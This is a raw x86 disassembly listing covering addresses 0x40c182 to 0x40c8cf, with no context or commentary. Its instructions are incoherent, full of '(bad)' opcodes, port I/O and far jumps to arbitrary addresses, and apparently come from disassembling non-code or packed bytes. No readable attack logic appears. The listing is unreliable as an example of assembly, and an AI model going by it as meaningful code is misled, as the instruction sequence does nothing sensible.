  40c182:	paddsb mm5,QWORD PTR [eax-0x49]
  40c186:	div    BYTE PTR [edx]
  40c188:	mov    edx,0xd1bab2a0
  40c18d:	cli    
  40c18e:	sub    al,0xa2
  40c190:	sbb    eax,0x57bd84b2
  40c195:	jnp    0x40c195
  40c197:	test   dh,ch
  40c199:	arpl   dx,dx
  40c19b:	mov    dl,0xc7
  40c19d:	cmp    al,BYTE PTR [ecx]
  40c19f:	adc    cl,BYTE PTR ds:[ebx-0x6d]
  40c1a3:	and    al,BYTE PTR [edi+0x61]
  40c1a6:	(bad)
  40c1aa:	pushf  
  40c1ab:	js     0x40c1e4
  40c1ad:	loope  0x40c1cd
  40c1af:	or     edi,DWORD PTR [eax+0x4942f7c9]
  40c1b5:	jp     0x40c197
  40c1b7:	push   es
  40c1b8:	aaa    
  40c1b9:	(bad)  
  40c1ba:	stc    
  40c1bb:	mov    eax,0xcd8a3a34
  40c1c0:	jmp    0x748f8733
  40c1c5:	scas   eax,DWORD PTR es:[edi]
  40c1c6:	push   esi
  40c1c7:	sbb    BYTE PTR [edx-0x80],0xa9
  40c1cb:	jp     0x40c1f4
  40c1cd:	mov    esp,0xdd3c545e
  40c1d2:	leave  
  40c1d3:	or     ch,bh
  40c1d5:	mov    cl,0x75
  40c1d7:	ins    DWORD PTR es:[edi],dx
  40c1d8:	call   0x2774fe63
  40c1dd:	fild   WORD PTR [esp+esi*4+0x5d]
  40c1e1:	leave  
  40c1e2:	sub    cl,BYTE PTR [eax+0x5469f11c]
  40c1e8:	ja     0x40c189
  40c1ea:	inc    esi
  40c1eb:	sbb    DWORD PTR [edx+eax*1-0x4e],esi
  40c1ef:	xchg   edx,eax
  40c1f0:	mov    gs,WORD PTR [ebx+0x643aa9a3]
  40c1f6:	arpl   WORD PTR cs:[ebx+ebx*4-0x4e],sp
  40c1fb:	pop    ebx
  40c1fc:	add    DWORD PTR [esi-0x6e],edx
  40c1ff:	rcl    BYTE PTR [esi],cl
  40c201:	ins    BYTE PTR es:[edi],dx
  40c202:	push   esp
  40c203:	inc    eax
  40c204:	cs stos DWORD PTR es:[edi],eax
  40c206:	bound  edi,QWORD PTR [esi+0x41]
  40c209:	mov    eax,0xda99faab
  40c20e:	scas   eax,DWORD PTR es:[edi]
  40c20f:	mov    al,0xd6
  40c211:	fstp   TBYTE PTR [eax]
  40c213:	sub    ebp,DWORD PTR [ebx]
  40c215:	mov    WORD PTR [ebx+0x12],ss
  40c218:	shl    ebp,cl
  40c21a:	into   
  40c21b:	mov    edx,0xfdefa0a
  40c220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c221:	mov    bl,dh
  40c223:	dec    edx
  40c224:	push   ecx
  40c225:	ins    BYTE PTR es:[edi],dx
  40c226:	iret   
  40c227:	pop    ebp
  40c228:	and    dl,ah
  40c22a:	arpl   WORD PTR [eax],cx
  40c22c:	sub    edi,DWORD PTR [eax]
  40c22e:	xor    BYTE PTR [ebx+0x45],bl
  40c231:	call   DWORD PTR [eax+0x12]
  40c234:	sub    edx,DWORD PTR [ebp+ecx*8-0x655afca2]
  40c23b:	or     dl,0x29
  40c23e:	fwait
  40c23f:	cwde   
  40c240:	or     cl,BYTE PTR [ecx]
  40c242:	fistp  QWORD PTR [ebx-0x385d774d]
  40c248:	test   al,0xf
  40c24a:	iret   
  40c24b:	cmc    
  40c24c:	or     al,0x59
  40c24e:	iret   
  40c24f:	bound  esi,QWORD PTR [ebp-0x7a]
  40c252:	in     al,0x94
  40c254:	and    eax,0x74e90456
  40c259:	push   0x0
  40c25b:	out    0x8e,al
  40c25d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c25e:	je     0x40c2da
  40c260:	jp     0x40c1f2
  40c262:	add    dl,BYTE PTR [ebx]
  40c264:	(bad)  
  40c266:	xor    ah,0x31
  40c269:	add    cl,BYTE PTR [esi-0x51]
  40c26c:	in     eax,dx
  40c26d:	sub    ebp,DWORD PTR [edx+eax*8]
  40c270:	in     eax,dx
  40c271:	cmovae ebx,DWORD PTR [esi]
  40c274:	int3   
  40c275:	scas   al,BYTE PTR es:[edi]
  40c276:	jb     0x40c275
  40c278:	push   ds
  40c279:	test   BYTE PTR [esi-0x4413837b],dl
  40c27f:	dec    ebp
  40c280:	dec    esi
  40c281:	rol    BYTE PTR cs:[esp+ecx*2+0x1a],1
  40c286:	push   cs
  40c287:	aam    0xa3
  40c289:	xor    bh,BYTE PTR [esi-0x2d]
  40c28c:	dec    ebp
  40c28d:	mov    al,0xc1
  40c28f:	jo     0x40c25c
  40c291:	inc    edi
  40c292:	ret    
  40c293:	cmp    al,0x77
  40c295:	cmc    
  40c296:	xor    DWORD PTR [edi],ebx
  40c298:	test   BYTE PTR [edi+0x50],0xeb
  40c29c:	fcom   DWORD PTR [ecx]
  40c29e:	bnd jns 0x40c23b
  40c2a1:	adc    dl,ah
  40c2a3:	clc    
  40c2a4:	xor    eax,0x7e61ceb6
  40c2a9:	std    
  40c2aa:	jge    0x40c2d5
  40c2ac:	fisttp DWORD PTR [eax]
  40c2ae:	jo     0x40c283
  40c2b0:	mov    edx,0x3358d015
  40c2b5:	loop   0x40c237
  40c2b7:	je     0x40c23b
  40c2b9:	icebp  
  40c2ba:	push   ebx
  40c2bb:	sbb    esp,0xffffffbf
  40c2be:	ss nop
  40c2c0:	jecxz  0x40c2c8
  40c2c2:	xor    DWORD PTR [edx+0x4f],esp
  40c2c5:	lahf   
  40c2c6:	jnp    0x40c30c
  40c2c8:	(bad)  
  40c2c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ca:	dec    edx
  40c2cb:	ret    
  40c2cc:	ror    DWORD PTR [ecx+0x75],1
  40c2cf:	sub    DWORD PTR [ecx],ebx
  40c2d1:	mov    ch,BYTE PTR [eax-0x7b]
  40c2d4:	mov    ebx,0x69b95c8b
  40c2d9:	ret    
  40c2da:	mov    DWORD PTR [edi+edi*1],0xbbb224d4
  40c2e1:	xor    BYTE PTR [edx-0x5a],bh
  40c2e4:	ds xor al,0xcc
  40c2e7:	mov    ecx,?
  40c2e9:	test   al,0x1b
  40c2eb:	adc    eax,0x921c9b07
  40c2f0:	sub    eax,0x9dbbf28f
  40c2f5:	retf   
  40c2f6:	(bad)  
  40c2f7:	fnstsw WORD PTR [ebx+0x72]
  40c2fa:	cmp    BYTE PTR [ebx+0x1e],ch
  40c2fd:	push   esi
  40c2fe:	inc    ebp
  40c2ff:	push   edi
  40c300:	sub    BYTE PTR [esi-0x19],ah
  40c303:	sub    esi,DWORD PTR [edi]
  40c305:	stc    
  40c306:	jp     0x40c327
  40c308:	adc    esi,DWORD PTR [esi+0x7e]
  40c30b:	push   ss
  40c30c:	push   esp
  40c30d:	push   ds
  40c30e:	mov    ah,0x54
  40c310:	push   0xd11fed0e
  40c315:	ins    BYTE PTR es:[edi],dx
  40c316:	or     eax,0x80037ce
  40c31b:	or     BYTE PTR [ebx],0x91
  40c31e:	jae    0x40c2a0
  40c320:	dec    ebx
  40c321:	add    esi,esi
  40c323:	or     DWORD PTR [edi],eax
  40c325:	xchg   DWORD PTR [esi],esi
  40c327:	shl    DWORD PTR [edi],1
  40c329:	call   0x229d:0x70e788d0
  40c330:	(bad)  
  40c331:	ss iret 
  40c333:	je     0x40c31d
  40c335:	jne    0x40c2e6
  40c337:	and    edi,DWORD PTR [edi+0x42db55c5]
  40c33d:	std    
  40c33e:	inc    esi
  40c33f:	inc    eax
  40c340:	inc    esi
  40c341:	dec    ecx
  40c342:	pop    ebp
  40c343:	push   ebp
  40c344:	sub    esi,eax
  40c346:	xchg   BYTE PTR [ecx-0x667a0c88],bl
  40c34c:	imul   edi,DWORD PTR [ecx],0x230d9f12
  40c352:	mov    dl,0x6c
  40c354:	mov    edi,ebx
  40c356:	pop    ebp
  40c357:	add    DWORD PTR [ecx+edx*1],esi
  40c35a:	mov    bl,0x36
  40c35c:	push   0x7ba18934
  40c361:	jne    0x40c3bd
  40c363:	and    BYTE PTR [ecx-0x1eeb2705],ch
  40c369:	push   esi
  40c36a:	sbb    dh,ch
  40c36c:	dec    ebx
  40c36d:	fld    TBYTE PTR [ecx+esi*2+0x4d99eb31]
  40c374:	xor    BYTE PTR [ebx-0x20bff0f6],ch
  40c37a:	loop   0x40c332
  40c37c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c37d:	or     ebp,DWORD PTR [ebp+0x4712ecb4]
  40c383:	retf   0x1547
  40c386:	adc    dh,bl
  40c388:	enter  0xb6c0,0xcf
  40c38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c38d:	cmp    dh,BYTE PTR [edx-0x1d7adfaa]
  40c393:	xchg   ebx,eax
  40c394:	and    DWORD PTR [esi+ebp*1-0xe],ebp
  40c398:	sub    bl,BYTE PTR [esi+0xece4d65]
  40c39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c39f:	xor    eax,0xcf04df81
  40c3a4:	adc    BYTE PTR [esp+ebx*1-0x1e],dh
  40c3a8:	xor    ah,dl
  40c3aa:	xchg   ecx,eax
  40c3ab:	cwde   
  40c3ac:	test   BYTE PTR [eax+edx*2-0x28],al
  40c3b0:	lods   eax,DWORD PTR ds:[esi]
  40c3b1:	hlt    
  40c3b2:	push   eax
  40c3b3:	lds    edi,FWORD PTR [eax-0x161150c0]
  40c3b9:	dec    edx
  40c3ba:	mov    ebp,0x312c9cd6
  40c3bf:	std    
  40c3c0:	retf   0x2c21
  40c3c3:	push   ecx
  40c3c4:	(bad)  
  40c3c6:	ja     0x40c378
  40c3c8:	dec    ah
  40c3ca:	or     eax,0x31edfe42
  40c3cf:	mov    DWORD PTR [ecx-0x6526d871],esi
  40c3d5:	adc    DWORD PTR [ebp-0x41],eax
  40c3d8:	aad    0xd2
  40c3da:	jl     0x40c368
  40c3dc:	jp     0x40c3c7
  40c3de:	pop    ebp
  40c3df:	cdq    
  40c3e0:	addr16 jne 0x40c37d
  40c3e3:	lds    ebp,FWORD PTR [ebp-0x22]
  40c3e6:	rcr    DWORD PTR [ecx-0x75c3937f],1
  40c3ec:	in     eax,0x71
  40c3ee:	mov    ds:0x6dc3c88d,al
  40c3f3:	mov    ebp,0xb041548
  40c3f8:	inc    eax
  40c3f9:	test   DWORD PTR [esi-0x444acb6f],ebx
  40c3ff:	adc    BYTE PTR [eax+0x27a948dc],0x50
  40c406:	dec    eax
  40c407:	pushf  
  40c408:	jl     0x40c435
  40c40a:	int    0xd7
  40c40c:	mov    BYTE PTR es:[ecx-0x54],bl
  40c410:	cmp    ah,BYTE PTR [edx]
  40c412:	fwait
  40c413:	inc    edx
  40c414:	das    
  40c415:	mov    BYTE PTR [ecx+0x55748174],bl
  40c41b:	jge    0x40c47d
  40c41d:	or     eax,0x749c18ed
  40c422:	push   esi
  40c423:	and    DWORD PTR [esi],esp
  40c425:	fisttp WORD PTR [edi+eiz*1+0x5b]
  40c429:	dec    edi
  40c42a:	xor    cl,BYTE PTR [eax]
  40c42c:	xchg   BYTE PTR [bp+di],dl
  40c42f:	mov    esp,0x8efec74e
  40c434:	add    eax,0x2a7531d8
  40c439:	inc    esi
  40c43b:	(bad)  
  40c43c:	jnp    0x40c3d0
  40c43e:	sar    BYTE PTR [edi-0x32ddca8f],cl
  40c444:	pop    esp
  40c445:	push   0x67
  40c447:	(bad)  
  40c449:	out    dx,eax
  40c44a:	shr    DWORD PTR [ecx],1
  40c44c:	das    
  40c44d:	xor    DWORD PTR [edx-0x15db9873],ebp
  40c453:	inc    ebx
  40c454:	jmp    0x5e0b624a
  40c459:	sbb    BYTE PTR [ebp-0x32677bbe],dl
  40c45f:	mov    bh,0x72
  40c461:	jecxz  0x40c4b5
  40c463:	shr    DWORD PTR [esi-0x70],1
  40c466:	add    ah,dl
  40c468:	sub    BYTE PTR [edi+0x111d9405],0xe1
  40c46f:	xchg   ebp,eax
  40c470:	retf   0x2ffb
  40c473:	mov    cs,WORD PTR [esi+eiz*1]
  40c476:	pop    edi
  40c477:	cld    
  40c478:	jl     0x40c41f
  40c47a:	in     eax,0x42
  40c47c:	inc    eax
  40c47d:	sub    dh,BYTE PTR [ebp+edx*1+0xb]
  40c481:	sbb    eax,0x2d7eeb32
  40c486:	xchg   esp,eax
  40c487:	dec    esp
  40c488:	aam    0xc0
  40c48a:	shl    DWORD PTR [esi],cl
  40c48c:	jmp    0x40c4e3
  40c48e:	xor    al,0xe3
  40c490:	add    eax,0x917a75e4
  40c495:	inc    esi
  40c496:	xor    eax,0x92094baf
  40c49b:	or     dl,0xac
  40c49e:	fucom  st(6)
  40c4a0:	addr16 loopne 0x40c493
  40c4a3:	and    bh,0xb4
  40c4a6:	dec    edx
  40c4a7:	sub    ebp,DWORD PTR ds:0xf33949b
  40c4ad:	jge    0x40c458
  40c4af:	xor    esi,ebp
  40c4b1:	shr    BYTE PTR [ebx],cl
  40c4b3:	mov    esp,0x3d866d00
  40c4b8:	push   ecx
  40c4b9:	push   edx
  40c4ba:	xchg   esi,eax
  40c4bb:	icebp  
  40c4bc:	out    dx,al
  40c4bd:	ret    
  40c4be:	add    ebx,DWORD PTR [edx+eax*2-0x68a31949]
  40c4c5:	lods   al,BYTE PTR ds:[esi]
  40c4c6:	mov    bl,0xb9
  40c4c8:	mov    ds:0x44489d2f,eax
  40c4cd:	jmp    0x40c50f
  40c4cf:	ins    BYTE PTR es:[edi],dx
  40c4d0:	scas   al,BYTE PTR es:[edi]
  40c4d1:	(bad)  
  40c4d2:	lock pop eax
  40c4d4:	daa    
  40c4d5:	sbb    al,0x43
  40c4d7:	push   eax
  40c4d8:	jb     0x40c492
  40c4da:	nop
  40c4db:	cli    
  40c4dc:	bound  ebx,QWORD PTR [edi-0x11]
  40c4df:	mov    al,0x6b
  40c4e1:	in     al,dx
  40c4e2:	cwd    
  40c4e4:	push   ebp
  40c4e5:	cmp    al,BYTE PTR [eax]
  40c4e7:	repnz repnz out dx,al
  40c4ea:	mov    ds:0x248fab99,eax
  40c4ef:	fbld   TBYTE PTR [esi]
  40c4f1:	sbb    BYTE PTR [esi+0x52],dl
  40c4f4:	test   DWORD PTR ds:0x9ba055b6,ebx
  40c4fa:	lods   al,BYTE PTR ds:[esi]
  40c4fb:	inc    edi
  40c4fc:	dec    edi
  40c4fd:	xchg   ebp,edi
  40c4ff:	test   BYTE PTR [ebx],ah
  40c501:	push   ecx
  40c502:	sub    eax,0x76a4ca56
  40c507:	pop    ebx
  40c508:	dec    edx
  40c509:	adc    bl,BYTE PTR [esi+esi*4-0xc]
  40c50d:	pop    es
  40c50e:	push   DWORD PTR [esi+0x1f93065d]
  40c514:	sub    BYTE PTR [eax],cl
  40c516:	jb     0x40c49c
  40c518:	(bad)  
  40c519:	repnz xchg ebp,edi
  40c51c:	mov    edi,0xc9ba32a
  40c521:	fldcw  WORD PTR [esi]
  40c523:	fisttp QWORD PTR [eax+0x78]
  40c526:	xchg   ebp,eax
  40c527:	lea    esi,[edx]
  40c529:	and    ah,bl
  40c52b:	jecxz  0x40c4e4
  40c52d:	adc    DWORD PTR [eax],edx
  40c52f:	dec    ebp
  40c530:	inc    esp
  40c531:	dec    ebx
  40c532:	enter  0xda0,0xc2
  40c536:	push   cs
  40c537:	cmp    eax,DWORD PTR [esi]
  40c539:	data16 neg BYTE PTR ss:[ebp-0x20]
  40c53e:	daa    
  40c53f:	cmp    cl,ch
  40c541:	dec    ecx
  40c542:	mov    bl,BYTE PTR [ebx-0x572708cb]
  40c548:	mov    WORD PTR [edx+0x6addd1e],ds
  40c54e:	mov    edi,0x76e8d4b2
  40c553:	add    DWORD PTR [esi],ebx
  40c555:	and    eax,0x2c2cee2f
  40c55a:	leave  
  40c55b:	mov    ecx,0x52d25653
  40c560:	scas   al,BYTE PTR es:[edi]
  40c561:	adc    ch,BYTE PTR [esi+0x5c]
  40c564:	mov    cl,0x6e
  40c566:	jo     0x40c5b6
  40c568:	inc    eax
  40c569:	sbb    esp,ebx
  40c56b:	add    al,0x17
  40c56d:	mov    cl,0x46
  40c56f:	lods   al,BYTE PTR ds:[esi]
  40c570:	scas   al,BYTE PTR es:[edi]
  40c571:	(bad)  [ebp-0xb7fe396]
  40c577:	inc    ebx
  40c578:	mov    ebp,edx
  40c57a:	shl    BYTE PTR [edi-0x50],1
  40c57d:	xchg   esi,eax
  40c57f:	mov    ah,0x74
  40c581:	mov    WORD PTR [ecx+0x77eab1a3],gs
  40c587:	dec    ecx
  40c588:	mov    eax,0xa6794c3e
  40c58d:	fsubr  QWORD PTR [eax]
  40c58f:	or     ebp,ebp
  40c591:	mov    esi,0x60697428
  40c596:	mov    ecx,DWORD PTR [esi]
  40c598:	out    dx,eax
  40c599:	xchg   edx,eax
  40c59a:	push   ds
  40c59b:	fwait
  40c59c:	adc    bl,BYTE PTR [ecx+0x61]
  40c59f:	shl    edi,0xfb
  40c5a2:	outs   dx,BYTE PTR ds:[esi]
  40c5a3:	adc    ah,BYTE PTR [eax]
  40c5a5:	lods   eax,DWORD PTR ds:[esi]
  40c5a6:	sbb    edi,DWORD PTR [edx+0x1a]
  40c5a9:	pop    ebp
  40c5aa:	sub    BYTE PTR [edi+0x7b67b936],bh
  40c5b0:	loope  0x40c619
  40c5b2:	pop    es
  40c5b3:	or     bl,0x28
  40c5b6:	push   0xf
  40c5b8:	(bad)  
  40c5b9:	ss sub esp,edx
  40c5bc:	out    0x89,al
  40c5be:	xor    edx,DWORD PTR [edi+0x55]
  40c5c1:	retf   
  40c5c2:	cvtpi2ps xmm2,QWORD PTR [ecx-0x5]
  40c5c6:	sub    eax,0x1f6d099f
  40c5cb:	ins    BYTE PTR es:[edi],dx
  40c5cc:	mov    ds:0x7ab3b322,al
  40c5d1:	sbb    ah,BYTE PTR [ebp+0x46]
  40c5d4:	imul   ebx,DWORD PTR [ebx],0x7dfb50ba
  40c5da:	hlt    
  40c5db:	and    bl,BYTE PTR [edi+ebx*1]
  40c5de:	and    eax,0xc18847f5
  40c5e3:	or     BYTE PTR [eax+0x6a],ah
  40c5e6:	jmp    0x95f6c37b
  40c5eb:	cmp    eax,0x40251273
  40c5f0:	add    eax,0xb5778008
  40c5f5:	push   0x62
  40c5f7:	in     al,dx
  40c5f8:	sar    BYTE PTR [ecx+0x15],0xd4
  40c5fc:	push   ebp
  40c5fd:	sbb    BYTE PTR [ebx*8+0x6c5d8849],ch
  40c604:	add    DWORD PTR [eax],0x69
  40c607:	inc    edi
  40c608:	ja     0x40c638
  40c60a:	cmc    
  40c60b:	add    al,0x8f
  40c60d:	sub    ah,bl
  40c60f:	pop    edx
  40c610:	mov    eax,ds:0x54161aa5
  40c615:	pop    edi
  40c616:	fsubr  QWORD PTR [edi-0x56]
  40c619:	and    DWORD PTR [edx+eiz*4+0x368123b],ebp
  40c620:	pusha  
  40c621:	cmp    al,0xe1
  40c623:	out    0xa9,eax
  40c625:	test   ah,0x2e
  40c628:	enter  0xeca8,0xd8
  40c62c:	out    dx,al
  40c62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c62e:	pop    ss
  40c62f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c630:	mov    BYTE PTR [esi-0x3d],0x69
  40c634:	push   ss
  40c635:	mov    WORD PTR [esi-0x2f46b78f],?
  40c63b:	cmp    BYTE PTR [eax+0xd],dh
  40c63e:	inc    edx
  40c63f:	ret    
  40c640:	(bad)  
  40c641:	sbb    dh,bl
  40c643:	ins    DWORD PTR es:[edi],dx
  40c644:	mov    bl,0xfe
  40c646:	cmp    bl,al
  40c648:	loopne 0x40c5d1
  40c64a:	loop   0x40c60d
  40c64c:	sub    ebp,DWORD PTR [edx]
  40c64e:	jmp    0x9c4f:0xf68099d9
  40c655:	or     eax,0xfa28effa
  40c65a:	adc    eax,esp
  40c65c:	repz aas 
  40c65e:	(bad)
  40c661:	neg    bl
  40c663:	jl     0x40c63d
  40c665:	inc    ecx
  40c666:	sub    eax,DWORD PTR [ecx]
  40c668:	popf   
  40c669:	jne    0x40c67f
  40c66b:	jne    0x40c6e4
  40c66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c66e:	xor    eax,0x234ed924
  40c673:	out    0xd3,al
  40c675:	dec    esp
  40c676:	sbb    eax,ebx
  40c678:	dec    eax
  40c679:	xchg   BYTE PTR [edx+0x7e5319ac],al
  40c67f:	in     eax,dx
  40c680:	mov    eax,ds:0xb5413b05
  40c685:	or     al,0x1c
  40c687:	jmp    0x3c19:0x5a9464e5
  40c68e:	pop    eax
  40c68f:	mov    ds:0x3b7cbd08,al
  40c694:	mov    bh,0x53
  40c696:	dec    DWORD PTR [esi-0x80]
  40c699:	aad    0x20
  40c69b:	inc    ecx
  40c69c:	jbe    0x40c70a
  40c69e:	stos   BYTE PTR es:[edi],al
  40c69f:	mov    ah,0xa0
  40c6a1:	ret    
  40c6a2:	inc    esi
  40c6a3:	shl    ch,cl
  40c6a5:	cmp    esp,DWORD PTR [eax-0x28]
  40c6a8:	xchg   edi,eax
  40c6a9:	loop   0x40c635
  40c6ab:	test   al,0x22
  40c6ad:	adc    ebx,0x6ef10a9a
  40c6b3:	fsubr  DWORD PTR [eax+0x50]
  40c6b6:	add    al,0xb9
  40c6b8:	or     BYTE PTR [edx+0x14],cl
  40c6bb:	fcmovbe st,st(1)
  40c6bd:	jg     0x40c6df
  40c6bf:	(bad)  [edx+0x32]
  40c6c2:	popa   
  40c6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c4:	or     bl,bl
  40c6c6:	lds    edx,FWORD PTR [edi+edx*8]
  40c6c9:	sti    
  40c6ca:	jge    0x40c68a
  40c6cc:	imul   edx,esi,0x3b5caf5
  40c6d2:	pop    ebx
  40c6d4:	sub    DWORD PTR [si-0x2793],0x5c
  40c6da:	xlat   BYTE PTR ds:[ebx]
  40c6db:	les    esi,FWORD PTR [eax+0xa59a66d]
  40c6e1:	mov    ah,0x21
  40c6e3:	xchg   esp,eax
  40c6e4:	icebp  
  40c6e5:	lahf   
  40c6e6:	fidiv  WORD PTR [ecx]
  40c6e8:	ds fs sub al,0x10
  40c6ec:	jmp    0x40c745
  40c6ee:	mov    eax,0x80d4d443
  40c6f3:	push   ecx
  40c6f4:	fsub   DWORD PTR [eax-0x2e745360]
  40c6fa:	test   DWORD PTR [ebp-0x80],ebx
  40c6fd:	in     eax,dx
  40c6fe:	jmp    0x8b9c:0x71460376
  40c705:	mov    WORD PTR [esi],gs
  40c707:	jbe    0x40c755
  40c709:	mov    ch,0xd5
  40c70b:	or     eax,0xb75f43cc
  40c710:	scas   al,BYTE PTR es:[edi]
  40c711:	push   edx
  40c712:	pop    esp
  40c713:	rol    ebx,cl
  40c715:	pop    eax
  40c716:	(bad)  
  40c717:	fld    DWORD PTR [esi]
  40c719:	jae    0x40c782
  40c71b:	xchg   ebx,eax
  40c71c:	cmp    al,0x9a
  40c71e:	out    0x6a,al
  40c720:	rcl    bl,cl
  40c722:	mov    dh,BYTE PTR [edi+ebp*8-0x66858f60]
  40c729:	ins    BYTE PTR es:[edi],dx
  40c72a:	xor    bh,dh
  40c72c:	iret   
  40c72d:	scas   eax,DWORD PTR es:[edi]
  40c72e:	test   BYTE PTR [ecx],cl
  40c730:	dec    ebp
  40c731:	shr    BYTE PTR [edi-0x3172bb74],0x4e
  40c738:	(bad)  
  40c739:	in     eax,dx
  40c73a:	adc    BYTE PTR [edi],bh
  40c73c:	mov    bh,0x34
  40c73e:	out    0x6d,eax
  40c740:	mov    ch,BYTE PTR [edi]
  40c742:	repnz les esi,FWORD PTR [esi]
  40c745:	into   
  40c746:	xchg   ebp,eax
  40c747:	call   0xee772738
  40c74c:	into   
  40c74d:	sti    
  40c74e:	popa   
  40c74f:	popa   
  40c750:	das    
  40c751:	fidivr DWORD PTR [edi]
  40c753:	push   ds
  40c754:	jle    0x40c73d
  40c756:	add    eax,0xa23fe47c
  40c75b:	pop    ds
  40c75c:	mov    dl,0x36
  40c75e:	(bad)  
  40c75f:	out    0x47,eax
  40c761:	mov    ebp,0xc9b899a7
  40c766:	mov    ecx,0x87dc3762
  40c76b:	scas   eax,DWORD PTR es:[edi]
  40c76c:	push   ecx
  40c76d:	mov    edi,ecx
  40c76f:	in     eax,dx
  40c770:	push   cs
  40c771:	out    0x70,eax
  40c773:	mov    ah,0xe0
  40c775:	hlt    
  40c776:	stos   BYTE PTR es:[edi],al
  40c777:	inc    ebx
  40c778:	pop    edi
  40c779:	lods   al,BYTE PTR ds:[esi]
  40c77a:	test   DWORD PTR [ebx-0x2040e387],0xb8c12221
  40c784:	pop    esp
  40c785:	rol    ebp,0x0
  40c788:	mov    cl,0x24
  40c78a:	popf   
  40c78b:	xor    cl,BYTE PTR [ecx+0x6]
  40c78e:	xchg   esp,eax
  40c78f:	mov    dh,0xdf
  40c791:	sub    ch,ah
  40c793:	push   0x4541b2d8
  40c798:	lahf   
  40c799:	fidiv  DWORD PTR [ebx+esi*8]
  40c79c:	mov    eax,0xf9a7e91c
  40c7a1:	cwde   
  40c7a2:	jecxz  0x40c795
  40c7a4:	repnz push edi
  40c7a6:	std    
  40c7a7:	ja     0x40c7d6
  40c7a9:	(bad)  
  40c7aa:	mov    eax,ds:0xd5ce6e70
  40c7af:	pusha  
  40c7b0:	adc    eax,0xe33a23fc
  40c7b5:	xor    esi,DWORD PTR [ecx]
  40c7b7:	aad    0xcc
  40c7b9:	add    BYTE PTR [edi+ebp*1+0x47],dh
  40c7bd:	ret    0xb9c5
  40c7c0:	or     al,0x2f
  40c7c2:	dec    ebp
  40c7c3:	mov    ah,0x27
  40c7c5:	xchg   DWORD PTR ds:0xfda8,edi
  40c7ca:	popfw  
  40c7cc:	add    BYTE PTR [ebp+0x42e6cced],0xe9
  40c7d3:	(bad)  
  40c7d4:	jnp    0x40c82e
  40c7d6:	imul   edx,DWORD PTR [ebp+ecx*4+0x20],0x2633c02a
  40c7de:	cmp    ecx,ebp
  40c7e0:	ss loope 0x40c838
  40c7e3:	inc    esp
  40c7e4:	lahf   
  40c7e5:	mov    edx,0x9ee03ad6
  40c7ea:	loope  0x40c861
  40c7ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ed:	out    0x3e,eax
  40c7ef:	or     DWORD PTR [ebx],eax
  40c7f1:	xor    esi,0x1ac1ba2b
  40c7f7:	pop    es
  40c7f8:	aas    
  40c7f9:	adc    ebx,DWORD PTR [edi+0x47]
  40c7fc:	mov    edx,0x383b116d
  40c801:	mov    bh,0x1f
  40c803:	lock sbb al,0x59
  40c806:	js     0x40c7ef
  40c808:	mov    DWORD PTR [esi],edx
  40c80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c80b:	leave  
  40c80c:	ja     0x40c7bf
  40c80e:	imul   ebp,DWORD PTR [ebp+eiz*1+0x5b],0xffffffb0
  40c813:	jae    0x40c7c3
  40c815:	xor    al,0x7c
  40c817:	lds    ecx,FWORD PTR [edi]
  40c819:	xchg   edx,eax
  40c81a:	cmp    eax,0x86daa6b8
  40c81f:	mov    dl,0xd3
  40c821:	aaa    
  40c822:	fnstsw WORD PTR [esi]
  40c824:	jmp    0x3343eb39
  40c829:	arpl   WORD PTR [ecx],ax
  40c82b:	ret    
  40c82c:	sub    dl,bl
  40c82e:	or     al,0xf9
  40c830:	(bad)  
  40c831:	pop    eax
  40c832:	mov    dh,0xd6
  40c834:	retf   
  40c835:	leave  
  40c836:	mov    ecx,0x1e7255cb
  40c83b:	add    esp,DWORD PTR [ebx+0x14ab40f5]
  40c841:	and    BYTE PTR gs:[edi+0x13],al
  40c845:	pop    DWORD PTR [eax]
  40c847:	ror    DWORD PTR [edx],cl
  40c849:	dec    esi
  40c84a:	xchg   edx,eax
  40c84b:	sub    DWORD PTR [eax],edi
  40c84d:	into   
  40c84e:	sub    eax,0x553d0f39
  40c853:	repz into 
  40c855:	fsin   
  40c857:	adc    al,BYTE PTR [esi-0x76]
  40c85a:	inc    ebp
  40c85b:	adc    edx,DWORD PTR [ebp+0x2a]
  40c85e:	gs mov edi,0x9d67f2f1
  40c864:	xor    eax,0xb2b90e4a
  40c869:	dec    ecx
  40c86a:	mov    dh,0x7
  40c86c:	xor    eax,0xf1e6ac84
  40c871:	jno    0x40c896
  40c873:	clc    
  40c874:	ficomp DWORD PTR [ecx-0xcfbf4b9]
  40c87a:	imul   bl
  40c87c:	jmp    0x1d3e:0x929581ae
  40c883:	shr    DWORD PTR [ecx+edi*4-0x6695718e],0x2b
  40c88b:	leave  
  40c88c:	jbe    0x40c8a7
  40c88e:	in     al,dx
  40c88f:	pop    esi
  40c890:	pushf  
  40c891:	inc    ecx
  40c892:	mov    bl,BYTE PTR [ecx]
  40c894:	in     al,dx
  40c895:	inc    ebx
  40c896:	mov    ecx,0xae18d9ae
  40c89b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c89d:	cwde   
  40c89e:	enter  0xe62a,0xcb
  40c8a2:	(bad)  
  40c8a3:	jno    0x40c84c
  40c8a5:	xor    al,0x6c
  40c8a7:	mov    eax,0x75066afa
  40c8ac:	cld    
  40c8ad:	pushf  
  40c8ae:	ja     0x40c91f
  40c8b0:	mov    ecx,0x39b5a3be
  40c8b5:	cmp    edx,ebx
  40c8b7:	dec    ecx
  40c8b8:	xchg   ebp,eax
  40c8b9:	or     BYTE PTR [eax+0x43],0xad
  40c8bd:	(bad)  
  40c8be:	fist   DWORD PTR [edx+0xa]
  40c8c1:	jmp    0x2aa5:0xf0b35208
  40c8c8:	mov    dh,0x73
  40c8ca:	imul   esp,DWORD PTR [ebx-0x7],0x1e
  40c8ce:	push   ebx
  40c8cf:	adc    eax,0x5fd09c32
